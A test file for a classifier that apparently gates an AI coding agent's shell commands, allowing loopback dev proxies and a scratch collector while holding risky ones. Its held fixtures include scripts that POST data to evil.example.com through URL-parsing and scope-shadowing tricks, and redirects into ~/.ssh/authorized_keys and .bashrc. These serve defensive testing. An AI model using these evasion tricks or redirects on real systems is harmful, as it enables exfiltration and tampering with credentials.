import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { join, resolve } from "path";
import { classifyToolCall, defaultProbes, SCRATCH_COLLECTOR_ENV, type FloorProbes } from "./classify.js";
import type { FloorConfig, FloorVerdict } from "./gate.js";

/*
 * A worker's own background runs with their output sent to a log under
 * $TMPDIR, the launch's scratch dir: an isolated scratch collector (this
 * checkout's real packages/collector/src/index.ts, read as in
 * false-holds-round-7-item11b.test.ts) and a dev proxy script in the worktree
 * that listens on loopback and forwards to a loopback port, including one
 * whose upstream URL is a template of constants (`http://${HOST}:${PORT}`),
 * read with the constants' values spliced in. The redirect is expanded by the
 * shell the command runs in, so it lands in the worker's TMPDIR whatever
 * TMPDIR the started program's env names; a TMPDIR the command reassigns
 * first is followed. A proxy that forwards elsewhere, a host constant a
 * parameter shadows or the code reassigns, or code that posts to a remote
 * URL, still holds.
 */

const REPO = resolve(import.meta.dir, "..", "..", "..", "..");
const HOME = join("/", "fake", "home");
const DATA = join(HOME, ".local", "share", "standup");
const ROOT = join(DATA, "worktrees", "standup", "feat-1");
const INSTALL = join("/", "fake", "install");
const ISO = join("/", "tmp", "standup-iso-1");
const COLLECTOR = join(ROOT, "packages", "collector");
const SCRATCH_ROOT = join(HOME, ".cache", "standup-scratch");
const SCRATCH = join(SCRATCH_ROOT, "11111111-2222-3333-4444-555555555555");

const config: FloorConfig = {
  v: 1,
  collectorUrl: "http://127.0.0.1:7777",
  launchId: "11111111-2222-3333-4444-555555555555",
  root: ROOT,
  sharedBranches: ["main", "mainline"],
  personalAwsAccounts: [],
  waitSeconds: 60,
  standupDataDir: DATA,
  floorPaths: [join(INSTALL, "packages", "collector", "src", "floor")],
  installDir: INSTALL,
  protectedPaths: [join(DATA, "secrets"), join(DATA, "review-scratch"), join(DATA, "review-media")],
  worktreeRoots: [join(DATA, "worktrees")],
  // As the launcher writes it (floorTmpDirs): the scratch dir is the worker's through scratchDir, not tmpDirs.
  tmpDirs: ["/tmp", "/var/tmp"],
  workerToken: "x".repeat(64),
  replyPublicKey: "test",
  scratchDir: SCRATCH,
  scratchRoot: SCRATCH_ROOT,
};

/** A Vite-style dev proxy: listens on loopback and forwards every request, with its method, to a loopback port. */
const PROXY = [
  'import http from "node:http";',
  "const TARGET = 3000;",
  "const server = http.createServer((req, res) => {",
  "  const upstream = http.request(",
  '    { host: "127.0.0.1", port: TARGET, path: req.url, method: req.method, headers: req.headers },',
  "    (up) => {",
  "      res.writeHead(up.statusCode ?? 502, up.headers);",
  "      up.pipe(res);",
  "    },",
  "  );",
  '  upstream.on("error", () => {',
  "    res.writeHead(502);",
  "    res.end();",
  "  });",
  "  req.pipe(upstream);",
  "});",
  'server.listen(4200, "127.0.0.1");',
  "",
].join("\n");

/** The same proxy forwarding to a URL on a loopback port. */
const PROXY_URL = PROXY.replace(
  '{ host: "127.0.0.1", port: TARGET, path: req.url, method: req.method, headers: req.headers }',
  "new URL(req.url, `http://127.0.0.1:${TARGET}`), { method: req.method, headers: req.headers }",
);

/** A fetch-based proxy whose upstream URL is built from a loopback host constant and a port constant. */
const proxyFetch = (host: string, extra = "") =>
  [
    'import http from "node:http";',
    `const HOST = "${host}";`,
    "const PORT = 3000;",
    "const UPSTREAM = `http://${HOST}:${PORT}`;",
    extra,
    "http",
    "  .createServer(async (req, res) => {",
    "    const chunks = [];",
    "    for await (const c of req) chunks.push(c);",
    '    const body = req.method === "GET" || req.method === "HEAD" ? undefined : Buffer.concat(chunks);',
    "    const r = await fetch(UPSTREAM + req.url, { method: req.method, headers: req.headers, body });",
    "    res.writeHead(r.status, Object.fromEntries(r.headers));",
    "    res.end(Buffer.from(await r.arrayBuffer()));",
    "  })",
    '  .listen(4200, "127.0.0.1", () => console.log(`proxy on http://127.0.0.1:4200 -> ${UPSTREAM}`));',
    "",
  ].join("\n");

/**
 * A proxy that parses the incoming request's URL against its Host header
 * (`new URL(req.url, \`http://${req.headers.host}\`)`) and forwards with
 * `request` as the fetch call and `parse` as the parsing statement.
 */
const hostHeaderProxy = (request: string, parse = 'const u = new URL(req.url ?? "/", `http://${req.headers.host}`);', extra = "") =>
  [
    'import http from "node:http";',
    'const UPSTREAM = "http://127.0.0.1:3000";',
    'const ROOT_URL = "http://127.0.0.1:3000/";',
    extra,
    "http",
    "  .createServer(async (req, res) => {",
    `    ${parse}`,
    "    const chunks = [];",
    "    for await (const c of req) chunks.push(c);",
    '    const body = req.method === "GET" || req.method === "HEAD" ? undefined : Buffer.concat(chunks);',
    `    const r = await ${request};`,
    "    res.writeHead(r.status, Object.fromEntries(r.headers));",
    "    res.end(Buffer.from(await r.arrayBuffer()));",
    "  })",
    '  .listen(4200, "127.0.0.1");',
    "",
  ].join("\n");

const OPTS = "{ method: req.method, headers: req.headers, body }";

/** Proxies whose Host-header URL is only read for its path, query and fragment: allowed. */
const HOST_HEADER_ALLOWED: Record<string, string> = {
  // Appended after a base whose authority a `/` already ends.
  "hh-path.mjs": hostHeaderProxy(`fetch(ROOT_URL + u.pathname.slice(1) + u.search, ${OPTS})`),
  "hh-literal.mjs": hostHeaderProxy(`fetch("http://127.0.0.1:3000/api" + u.pathname + u.search, ${OPTS})`),
  "hh-template.mjs": hostHeaderProxy(`fetch(\`\${ROOT_URL}\${u.pathname}\${u.search}\${u.hash}\`, ${OPTS})`),
  "hh-template-literal.mjs": hostHeaderProxy(`fetch(\`http://127.0.0.1:3000/\${u.pathname}\${u.search}\`, ${OPTS})`),
  "hh-compare.mjs": hostHeaderProxy(`(u.pathname === "/health" || u.pathname.startsWith("/api") ? fetch(ROOT_URL + u.pathname, ${OPTS}) : fetch(ROOT_URL + "health", ${OPTS}))`),
  "hh-https-slash.mjs": hostHeaderProxy(`fetch(ROOT_URL + u.pathname, ${OPTS})`, 'const u = new URL(req.url, `https://${req.headers["host"]}/`);'),
};

/** Proxies whose Host-header URL, or the Host header itself, may reach the request: held. */
const HOST_HEADER_HELD: Record<string, string> = {
  "hh-whole.mjs": hostHeaderProxy(`fetch(u, ${OPTS})`),
  // Appended to a base that ends at its host: a non-special scheme's path (`x:@evil.example.com`) need not start with `/`.
  "hh-open-base.mjs": hostHeaderProxy(`fetch(UPSTREAM + u.pathname + u.search, ${OPTS})`),
  "hh-open-template.mjs": hostHeaderProxy(`fetch(\`\${UPSTREAM}\${u.pathname}\`, ${OPTS})`),
  "scheme.mjs": hostHeaderProxy('fetch("http://127.0.0.1:3000" + u.pathname, { method: "POST", body })', 'const u = new URL("x:@evil.example.com", `http://${req.headers.host}`);'),
  "scheme-const.mjs": hostHeaderProxy('fetch(UPSTREAM + u.pathname, { method: "POST", body })', 'const u = new URL("x:@evil.example.com", `http://${req.headers.host}`);'),
  "scheme-template.mjs": hostHeaderProxy('fetch(`${UPSTREAM}${u.pathname}`, { method: "POST", body })', 'const u = new URL("x:@evil.example.com", `http://${req.headers.host}`);'),
  // A query parameter, or a path part handed to a call or a name of its own, may be a whole URL.
  "hh-params.mjs": hostHeaderProxy(`fetch(UPSTREAM + u.pathname + "?q=" + encodeURIComponent(u.searchParams.get("q") ?? ""), ${OPTS})`),
  "hh-param-target.mjs": hostHeaderProxy(`fetch(u.searchParams.get("to"), { method: "POST", body })`),
  "hh-path-target.mjs": hostHeaderProxy(`fetch("http:" + u.pathname, ${OPTS})`),
  "hh-path-alias.mjs": hostHeaderProxy(`fetch("http:" + p, ${OPTS})`, 'const u = new URL(req.url ?? "/", `http://${req.headers.host}`); const p = u.pathname;'),
  "hh-path-call.mjs": hostHeaderProxy(`fetch(decodeURIComponent(u.pathname.slice(1)), ${OPTS})`),
  // Appended to a base that ends at its host, an empty fragment lets later text extend the authority.
  "hh-authority.mjs": hostHeaderProxy(`fetch("http://127.0.0.1:3000" + u.hash + "@evil.example.com/", ${OPTS})`),
  "hh-authority-template.mjs": hostHeaderProxy(`fetch(\`http://127.0.0.1:3000\${u.search}@evil.example.com/\`, ${OPTS})`),
  "hh-href.mjs": hostHeaderProxy(`fetch(u.href, ${OPTS})`),
  "hh-tostring.mjs": hostHeaderProxy(`fetch(u.toString(), ${OPTS})`),
  "hh-string.mjs": hostHeaderProxy(`fetch(String(u), ${OPTS})`),
  "hh-interpolated.mjs": hostHeaderProxy(`fetch(\`\${u}\`, ${OPTS})`),
  "hh-origin.mjs": hostHeaderProxy(`fetch(u.origin + u.pathname, ${OPTS})`),
  "hh-host.mjs": hostHeaderProxy(`fetch("http://" + u.host + u.pathname, ${OPTS})`),
  "hh-alias.mjs": hostHeaderProxy(`fetch(v.pathname ? v : UPSTREAM, ${OPTS})`, 'const u = new URL(req.url ?? "/", `http://${req.headers.host}`); const v = u;'),
  "hh-spread.mjs": hostHeaderProxy(`fetch(UPSTREAM + u.pathname, { ...${OPTS}, u })`),
  "hh-chained.mjs": hostHeaderProxy(`fetch(u.pathname ? UPSTREAM : "", ${OPTS})`, 'const u = new URL(req.url ?? "/", `http://${req.headers.host}`).href;'),
  "hh-forward-host.mjs": hostHeaderProxy(`fetch(\`http://\${req.headers.host}\${req.url}\`, ${OPTS})`),
  "hh-forward-host-too.mjs": hostHeaderProxy(`fetch(UPSTREAM + u.pathname, ${OPTS}).then(() => fetch(\`http://\${req.headers.host}/x\`, { method: "POST", body }))`),
  "hh-eval.mjs": hostHeaderProxy(`fetch(eval("u"), ${OPTS})`),
  "hh-url-shadowed.mjs": hostHeaderProxy(`fetch(UPSTREAM + u.pathname, ${OPTS})`, undefined, "const URL = globalThis.Proxy ? class { constructor(p, b) { return { pathname: b, toString: () => b }; } } : null;"),
  "hh-ambiguous-slash.mjs": hostHeaderProxy(`fetch(UPSTREAM + u.pathname, ${OPTS})`, undefined, "const half = (1) / 2;"),
};

/** Code where the HOST a URL template reads may not be the loopback const of that name, or a URL is read off a parse-only base. */
const SCOPE_PROBES: Record<string, string> = {
  "shadow.js": '{ const HOST = "127.0.0.1"; }\nglobalThis["HO" + "ST"] = "evil.example.com";\nawait fetch(`http://${HOST}/x`, { method: "POST", body: "data" });\n',
  "with.js": 'const HOST = "127.0.0.1";\nwith ({ ["HO" + "ST"]: "evil.example.com" }) fetch(`http://${HOST}/x`, { method: "POST", body: "data" });\n',
  "fnscope.js": 'function f() { const HOST = "127.0.0.1"; return HOST2; }\nglobalThis[process.argv[2]] = process.argv[3];\nawait fetch(`http://${HOST}/x`, { method: "POST", body: "data" });\n',
  "block.js": 'if (process.argv[2]) { const HOST = "127.0.0.1"; }\nawait fetch(`http://${HOST}/x`, { method: "POST", body: "data" });\n',
  "funcparam.js": 'const HOST = "127.0.0.1";\nfunction send(a, HOST) { return fetch(`http://${HOST}/x`, { method: "POST", body: a }); }\nawait send("data", process.argv[2]);\n',
  "catchparam.js": 'const HOST = "127.0.0.1";\ntry { throw process.argv[2]; } catch (HOST) { await fetch(`http://${HOST}/x`, { method: "POST", body: "data" }); }\n',
  "listen-too.mjs": [
    'import http from "node:http";',
    'const HOST = "127.0.0.1";',
    "const PORT = 3000;",
    "http.createServer((q, s) => s.end()).listen(4200, HOST);",
    'await fetch(`http://${HOST}:${PORT}/x`, { method: "POST", body: "{}" });',
    "",
  ].join("\n"),
  "param.js":'const HOST = "127.0.0.1";\nconst send = (HOST) => fetch(`http://${HOST}/x`, { method: "POST", body: "data" });\nawait send(process.argv[2]);\n',
  "server.js": [
    'const req = await (await fetch("http://127.0.0.1:3000/next")).json();',
    "const u = new URL(req.url, `http://${req.headers.host}`);",
    'await fetch(u.searchParams.get("to"), { method: "POST", body: "data" });',
    "",
  ].join("\n"),
};

/** A function whose parameter shadows the loopback HOST constant, called with a remote host. */
const SHADOWED = [
  "async function send(HOST) {",
  '  await fetch(`http://${HOST}/v1/items`, { method: "POST", body: "{}" });',
  "}",
  'await send("api.example.com");',
].join("\n");

/** The proxy forwarding to a remote host. */
const PROXY_REMOTE = PROXY.replace('host: "127.0.0.1"', 'host: "api.example.com"');

/** A script that posts to a remote URL. */
const POSTS = 'await fetch("https://api.example.com/v1/items", { method: "POST", body: "{}" });\n';

const BASE_VIRTUAL: Record<string, string> = {
  [join(ROOT, ".git")]: "gitdir: /fake/install/.git/worktrees/feat-1\n",
  [join(ROOT, "server", "proxy.mjs")]: PROXY,
  [join(ROOT, "server", "proxy-url.mjs")]: PROXY_URL,
  [join(ROOT, "server", "proxy-fetch.mjs")]: proxyFetch("127.0.0.1"),
  [join(ROOT, "server", "proxy-fetch-localhost.mjs")]: proxyFetch("localhost"),
  [join(ROOT, "server", "proxy-fetch-remote.mjs")]: proxyFetch("api.example.com"),
  [join(ROOT, "server", "proxy-fetch-shadowed.mjs")]: proxyFetch("127.0.0.1", SHADOWED),
  [join(ROOT, "server", "proxy-fetch-reassigned.mjs")]: proxyFetch("127.0.0.1").replace("const HOST", "let HOST") + 'HOST = "api.example.com";\n',
  [join(ROOT, "server", "proxy-remote.mjs")]: PROXY_REMOTE,
  [join(ROOT, "server", "posts.mjs")]: POSTS,
  ...Object.fromEntries(Object.entries({ ...HOST_HEADER_ALLOWED, ...HOST_HEADER_HELD }).map(([name, text]) => [join(ROOT, "server", name), text])),
  ...Object.fromEntries(Object.entries(SCOPE_PROBES).map(([name, text]) => [join(ROOT, name), text])),
  [join(DATA, "standup.db")]: "",
  [join(DATA, "secrets", "owner.token")]: "secret",
};

/** Dirs already made. */
const MADE = [join(ISO, "tmux"), join(ISO, "home"), SCRATCH, join(HOME, ".ssh")];

/** The worker's env as the hook sees it: in a tmux pane, with its temp dirs in the launch's scratch dir. */
const WORKER_ENV: Record<string, string> = {
  TMUX: "/tmp/tmux-1000/default,1,0",
  TMUX_PANE: "%1",
  TMPDIR: SCRATCH,
  TMP: SCRATCH,
  TEMP: SCRATCH,
  HOME,
  PATH: "/usr/bin:/bin",
};

/** The real path a virtual worktree or install path reads through to, or null for the rest of the virtual machine. */
function real(p: string): string | null {
  for (const base of [ROOT, INSTALL]) {
    if (p === base) return REPO;
    if (p.startsWith(`${base}/`)) return join(REPO, p.slice(base.length + 1));
  }
  return null;
}

function probes(): Partial<FloorProbes> {
  const VIRTUAL = BASE_VIRTUAL;
  const disk = defaultProbes();
  const dirs = new Set<string>(["/", "/tmp", ...MADE]);
  for (const f of [...Object.keys(VIRTUAL), ...MADE]) for (let d = f.slice(0, f.lastIndexOf("/")); d; d = d.slice(0, d.lastIndexOf("/"))) dirs.add(d);
  dirs.delete(join(ROOT, ".git"));
  const bare = (p: string) => (p.length > 1 ? p.replace(/\/+$/, "") : p);
  const exists = (p: string) => p in VIRTUAL || dirs.has(bare(p)) || (real(p) !== null && disk.exists(real(p)!));
  const isDirectory = (p: string) => !(p in VIRTUAL) && (dirs.has(bare(p)) || (real(p) !== null && disk.isDirectory(real(p)!)));
  return {
    gitBranch: () => "standup/feat-1",
    gitAlias: () => null,
    gitHooksDir: () => null,
    gitCommonDir: () => null,
    readFile: (p, max) => (p in VIRTUAL ? { ok: true, text: VIRTUAL[p]! } : real(p) !== null ? disk.readFile(real(p)!, max) : { ok: false, reason: "missing" }),
    exists,
    isDirectory,
    executable: (p) => (p in VIRTUAL ? false : real(p) !== null ? disk.executable(real(p)!) : null),
    listDir: (raw) => {
      const p = bare(raw);
      if (!isDirectory(p)) return null;
      const virtual = Object.keys(VIRTUAL).concat([...dirs]).filter((f) => f.startsWith(`${p === "/" ? "" : p}/`)).map((f) => f.slice(p.length + 1).split("/")[0]!);
      const onDisk = real(p) !== null ? (disk.listDir(real(p)!) ?? []).filter((n) => n !== ".git") : [];
      return [...new Set([...virtual, ...onDisk])];
    },
    lstat: (p) => (exists(p) ? { symlink: false, file: !isDirectory(p), nlink: 1 } : null),
    realpath: (p) => (exists(p) ? bare(p) : null),
    homeDir: () => HOME,
    env: (name) => WORKER_ENV[name],
    awsAccount: () => null,
    gitTree: () => null,
    gitAncestor: () => null,
    gitBlob: () => ({ ok: false, reason: "missing" }),
  };
}

function bash(command: string, cwd = COLLECTOR): FloorVerdict {
  return classifyToolCall({ toolName: "Bash", toolInput: { command }, cwd }, config, probes());
}

// The hook shares the worker's env: its TMPDIR is the launch's scratch dir.
let savedTmpdir: string | undefined;
beforeAll(() => {
  savedTmpdir = process.env.TMPDIR;
  process.env.TMPDIR = SCRATCH;
});
afterAll(() => {
  if (savedTmpdir === undefined) delete process.env.TMPDIR;
  else process.env.TMPDIR = savedTmpdir;
});

const FLAGS = SCRATCH_COLLECTOR_ENV.map(([k, v]) => `${k}=${v}`).join(" ");
const PORTS = "COLLECTOR_PORT=29777 WS_PORT=29778";

/** Every path env var the collector reads, under `r`. */
function paths(r: string): string {
  return [
    `HOME=${r}/home XDG_CONFIG_HOME=${r}/xdg/config XDG_DATA_HOME=${r}/xdg/data XDG_CACHE_HOME=${r}/xdg/cache XDG_STATE_HOME=${r}/xdg/state`,
    `TMPDIR=${r}/tmp TMUX_TMPDIR=${r}/tmux DB_PATH=${r}/db KNOWLEDGE_DIR=${r}/kb STANDUP_INTERNAL_ROOT=${r}/internal STANDUP_PROJECT_DOCS_DIR=${r}/docs`,
    `ICONS_DIR=${r}/icons STANDUP_WRITE_TOKEN_FILE=${r}/token STANDUP_PROJECTS_PATH=${r}/projects.json STANDUP_WORKTREE_ROOT=${r}/wt`,
  ].join(" ");
}

/** The isolated start, backgrounded with its output sent to `log`. */
function start(r: string, log: string): string {
  return `env -i PATH=/home/u/.bun/bin:/usr/bin:/bin ${paths(r)} ${PORTS} ${FLAGS} bun packages/collector/src/index.ts > ${log} 2>&1 &`;
}

const MKTEMP = "R=$(mktemp -d -p /tmp x-XXXXXX)";

/** A complete isolation under one /tmp root, with only TMUX and TMUX_PANE dropped from the env. */
const FULL_ISO_ENV = [
  "env -u TMUX -u TMUX_PANE",
  ...Object.entries({
    HOME: "home",
    XDG_CONFIG_HOME: "xdg/config",
    XDG_DATA_HOME: "xdg/data",
    XDG_STATE_HOME: "xdg/state",
    XDG_CACHE_HOME: "xdg/cache",
    DB_PATH: "data/standup.db",
    STANDUP_SQLITE_PATH: "data/standup.db",
    KNOWLEDGE_DIR: "knowledge",
    STANDUP_INTERNAL_ROOT: "internal",
    STANDUP_PROJECT_DOCS_DIR: "docs",
    TMPDIR: "tmp",
    TMP: "tmp",
    TEMP: "tmp",
    TMUX_TMPDIR: "tmux",
  }).map(([k, v]) => `${k}=${ISO}/${v}`),
].join(" ");

function action(command: string, cwd = ROOT): { command: string; action: string; reason?: string } {
  const v = bash(command, cwd);
  return v.action === "hold" ? { command, action: v.action, reason: v.reason } : { command, action: v.action };
}
const allowed = (command: string) => ({ command, action: "allow" });
const held = (command: string, reason: RegExp) => ({ command, action: "hold", reason: expect.stringMatching(reason) });

describe("an isolated scratch collector with its output sent to a log under $TMPDIR", () => {
  test("is allowed for $TMPDIR, \"$TMPDIR\" and ${TMPDIR}", () => {
    for (const log of ["$TMPDIR/collector.log", '"$TMPDIR"/collector.log', "${TMPDIR}/collector.log", '"$TMPDIR/collector.log"']) {
      const command = `${MKTEMP}; mkdir -p $R/home $R/tmux; ${start("$R", log)}`;
      expect(action(command)).toEqual(allowed(command));
    }
    for (const command of [
      `${MKTEMP} && mkdir -p $R/home $R/tmux && ${start("$R", "$TMPDIR/collector.log")} echo $! > $TMPDIR/collector.pid`,
      `${MKTEMP}; mkdir -p $R/home $R/tmux; nohup ${start("$R", "$TMPDIR/collector.log")}`,
      `${MKTEMP}; mkdir -p $R/home $R/tmux; ${start("$R", "$TMPDIR/collector.log")} sleep 3; tail -n 20 $TMPDIR/collector.log`,
      `${MKTEMP}\nmkdir -p $R/home $R/tmux\n${start("$R", "$TMPDIR/collector-$$.log")}`,
      `export R=$(mktemp -d -p /tmp x-XXXXXX); mkdir -p $R/home $R/tmux; ${start("$R", "$TMPDIR/collector.log")}`,
    ]) {
      expect(action(command)).toEqual(allowed(command));
    }
    const cd = `${MKTEMP}; mkdir -p $R/home $R/tmux; cd packages/collector && ${start("$R", "$TMPDIR/collector.log").replace("bun packages/collector/src/index.ts", "bun run src/index.ts")}`;
    expect(action(cd)).toEqual(allowed(cd));
    for (const command of [
      `${FULL_ISO_ENV} ${FLAGS} PORT=17891 bun run packages/collector/src/index.ts > $TMPDIR/collector.log 2>&1 &`,
      `${FULL_ISO_ENV} ${FLAGS} PORT=17891 bun run packages/collector/src/index.ts > $TMPDIR/collector.log 2>&1`,
      `${FULL_ISO_ENV} ${FLAGS} PORT=17891 bun run packages/collector/src/index.ts > ${ISO}/collector.log 2>&1 &`,
      `${MKTEMP}; mkdir -p $R/home $R/tmux; ${start("$R", "$TMPDIR/collector.log").replace(/ (?=[A-Z_]+=)/g, " \\\n  ")}`,
      `${MKTEMP}\nmkdir -p "$R/home" "$R/tmux" "$R/tmp"\n${start("$R", "$TMPDIR/collector.log")}`,
    ]) {
      expect(action(command)).toEqual(allowed(command));
    }
  }, 240_000);

  test("is allowed when classified again in the collector, whose environment has no TMPDIR", () => {
    delete WORKER_ENV.TMPDIR;
    try {
      const command = `${MKTEMP}; mkdir -p $R/home $R/tmux; ${start("$R", "$TMPDIR/collector.log")}`;
      expect(action(command)).toEqual(allowed(command));
      const proxy = "node server/proxy-fetch.mjs > $TMPDIR/proxy.log 2>&1 &";
      expect(action(proxy)).toEqual(allowed(proxy));
    } finally {
      WORKER_ENV.TMPDIR = SCRATCH;
    }
  }, 240_000);

  test("the env -i TMPDIR is the program's, not the redirect's: a TMPDIR set only for the command doesn't move the log", () => {
    const command = `${MKTEMP}; mkdir -p $R/home $R/tmux; env -i TMPDIR=${join(HOME, ".ssh")} ${start("$R", "$TMPDIR/collector.log").slice("env -i ".length)}`;
    expect(action(command)).toEqual(allowed(command));
  }, 240_000);

  test("a log under a dir the shell's own TMPDIR was reassigned to, $HOME/.ssh, an unknown variable or a climb out still holds", () => {
    const logs = ["$HOME/.ssh/collector.log", "$SOME_UNKNOWN_VAR/collector.log", "$TMPDIR/../../../.ssh/authorized_keys", "$TMPDIR/../../../.bashrc"];
    const reassigned = [`TMPDIR=${join(HOME, ".ssh")};`, `export TMPDIR=${join(HOME, ".ssh")};`, "TMPDIR=$HOME/.ssh;"];
    const commands = [
      ...logs.map((log) => `${MKTEMP}; mkdir -p $R/home $R/tmux; ${start("$R", log)}`),
      ...reassigned.map((r) => `${MKTEMP}; mkdir -p $R/home $R/tmux; ${r} ${start("$R", "$TMPDIR/authorized_keys")}`),
    ];
    // A write the floor can't place spoils the isolation: the collector's own code is then read as run outside it.
    const reasons = commands.map((c) => (c.includes("$SOME_UNKNOWN_VAR") ? /names Standup's data dir/ : /^redirect > writes \S+, part of the safety floor/));
    expect(commands.map((c) => action(c))).toEqual(commands.map((c, i) => held(c, reasons[i]!)));
  }, 240_000);
});

describe("a dev proxy script in the worktree with its output sent to a log under $TMPDIR", () => {
  test("that listens on and forwards to loopback is allowed", () => {
    for (const command of [
      "node server/proxy.mjs > $TMPDIR/proxy.log 2>&1 &",
      'node server/proxy.mjs > "$TMPDIR/proxy.log" 2>&1 &',
      "node server/proxy-url.mjs > ${TMPDIR}/proxy.log 2>&1 &",
      "node server/proxy-fetch.mjs > $TMPDIR/proxy.log 2>&1 &",
      'node server/proxy-fetch-localhost.mjs > "$TMPDIR"/proxy.log 2>&1 &',
      "node server/proxy.mjs",
      // The host constant also handed whole to a call.
      "bun listen-too.mjs",
    ]) {
      expect(action(command)).toEqual(allowed(command));
    }
  });

  test("that forwards to a remote host, or code that posts to a remote URL, still holds", () => {
    const commands = [
      "node server/proxy-remote.mjs > $TMPDIR/proxy.log 2>&1 &",
      "node server/posts.mjs > $TMPDIR/p.log 2>&1 &",
      // A host constant naming a remote host, one a parameter shadows, or one the code reassigns.
      "node server/proxy-fetch-remote.mjs > $TMPDIR/proxy.log 2>&1 &",
      "node server/proxy-fetch-shadowed.mjs > $TMPDIR/proxy.log 2>&1 &",
      "node server/proxy-fetch-reassigned.mjs > $TMPDIR/proxy.log 2>&1 &",
    ];
    expect(commands.map((c) => action(c))).toEqual(commands.map((c) => held(c, /^code in \S+ sends a (?:write )?request to a remote service$/)));
  });

  test("that parses the request's URL against its Host header and reads only its path, query and fragment, is allowed", () => {
    const commands = Object.keys(HOST_HEADER_ALLOWED).map((name) => `node server/${name} > $TMPDIR/proxy.log 2>&1 &`);
    expect(commands.map((c) => action(c))).toEqual(commands.map((c) => allowed(c)));
  });

  test("whose Host-header URL is sent, stringified, aliased or read for its origin, or that forwards to the Host header, still holds", () => {
    const commands = Object.keys(HOST_HEADER_HELD).map((name) => `node server/${name} > $TMPDIR/proxy.log 2>&1 &`);
    expect(commands.map((c) => action(c))).toEqual(commands.map((c) => held(c, /^code in \S+ sends a (?:write )?request to a remote service$/)));
  });

  test("a host constant read where another binding, a computed global or a `with` scope may stand for it, still holds", () => {
    const commands = ["bun shadow.js", "bun with.js", "bun fnscope.js HOST evil.example.com", "bun block.js", "bun param.js api.example.com", "bun funcparam.js api.example.com", "bun catchparam.js api.example.com"];
    expect(commands.map((c) => action(c))).toEqual(commands.map((c) => held(c, /^code in \S+ sends a write request to a remote service$/)));
  });

  test("a POST to a URL read off a parse-only base still holds", () => {
    expect(action("bun server.js")).toEqual(held("bun server.js", /^code in \S+ sends a write request to a remote service$/));
  });

  test("with its log moved by a reassigned TMPDIR to a guarded file, still holds", () => {
    const command = `TMPDIR=${join(HOME, ".ssh")}; node server/proxy.mjs > $TMPDIR/authorized_keys 2>&1 &`;
    expect(action(command)).toEqual(held(command, /^redirect > writes \$TMPDIR\/authorized_keys, part of the safety floor/));
  });
});
